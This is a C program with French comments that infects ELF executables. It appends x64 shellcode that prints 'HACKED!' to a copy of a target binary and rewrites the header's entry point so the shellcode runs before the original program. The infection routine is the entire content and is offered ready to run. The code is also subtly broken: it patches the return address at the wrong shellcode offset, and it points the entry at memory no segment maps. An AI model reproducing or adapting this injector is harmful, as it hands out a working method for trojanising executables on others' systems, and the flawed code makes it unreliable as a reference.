#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <elf.h>

// Shellcode qui affiche "HACKED!" et retourne au code original (x64)
unsigned char shellcode[] = {
    0x48, 0xC7, 0xC0, 0x01, 0x00, 0x00, 0x00, // mov rax, 1 (sys_write)
    0x48, 0xC7, 0xC7, 0x01, 0x00, 0x00, 0x00, // mov rdi, 1 (stdout)
    0x48, 0x8D, 0x35, 0x0A, 0x00, 0x00, 0x00, // lea rsi, [rel msg]
    0x48, 0xC7, 0xC2, 0x08, 0x00, 0x00, 0x00, // mov rdx, 8
    0x0F, 0x05,                               // syscall
    0x48, 0xB8, 0xEF, 0xBE, 0xAD, 0xDE, 0x00, // movabs rax, 0xdeadbeef (original entry)
    0x00, 0x00, 0x00,
    0xFF, 0xE0,                               // jmp rax
    'H', 'A', 'C', 'K', 'E', 'D', '!', '\n'  // msg
};

void inject(const char *target, const char *output) {
    int fd = open(target, O_RDONLY);
    if (fd < 0) { perror("open"); exit(1); }

    // Lire l'en-tête ELF
    Elf64_Ehdr ehdr;
    read(fd, &ehdr, sizeof(ehdr));

    // Vérifier que c'est un ELF64
    if (memcmp(ehdr.e_ident, ELFMAG, SELFMAG) != 0) {
        fprintf(stderr, "Not an ELF file.\n");
        exit(1);
    }

    // Lire les en-têtes de programme
    lseek(fd, ehdr.e_phoff, SEEK_SET);
    Elf64_Phdr *phdr = malloc(ehdr.e_phentsize * ehdr.e_phnum);
    read(fd, phdr, ehdr.e_phentsize * ehdr.e_phnum);

    // Trouver le dernier segment et calculer la nouvelle adresse
    Elf64_Addr last_end = 0;
    for (int i = 0; i < ehdr.e_phnum; i++) {
        if (phdr[i].p_type == PT_LOAD && phdr[i].p_flags & PF_X) {
            last_end = phdr[i].p_vaddr + phdr[i].p_memsz;
        }
    }

    // Adresse du shellcode (alignée)
    Elf64_Addr new_entry = (last_end + 0xFFF) & ~0xFFF;

    // Mettre à jour le shellcode avec l'adresse originale
    *(Elf64_Addr*)(shellcode + 25) = ehdr.e_entry;

    // Écrire le nouveau binaire
    int out_fd = open(output, O_WRONLY | O_CREAT | O_TRUNC, 0755);
    if (out_fd < 0) { perror("open"); exit(1); }

    // Copier le contenu original
    lseek(fd, 0, SEEK_SET);
    char buf[4096];
    ssize_t n;
    while ((n = read(fd, buf, sizeof(buf))) > 0) {
        write(out_fd, buf, n);
    }

    // Écrire le shellcode à la fin
    lseek(out_fd, 0, SEEK_END);
    write(out_fd, shellcode, sizeof(shellcode));

    // Mettre à jour l'en-tête ELF
    ehdr.e_entry = new_entry;
    lseek(out_fd, 0, SEEK_SET);
    write(out_fd, &ehdr, sizeof(ehdr));

    close(fd);
    close(out_fd);
    free(phdr);
}

int main(int argc, char **argv) {
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <input> <output>\n", argv[0]);
        return 1;
    }
    inject(argv[1], argv[2]);
    return 0;
}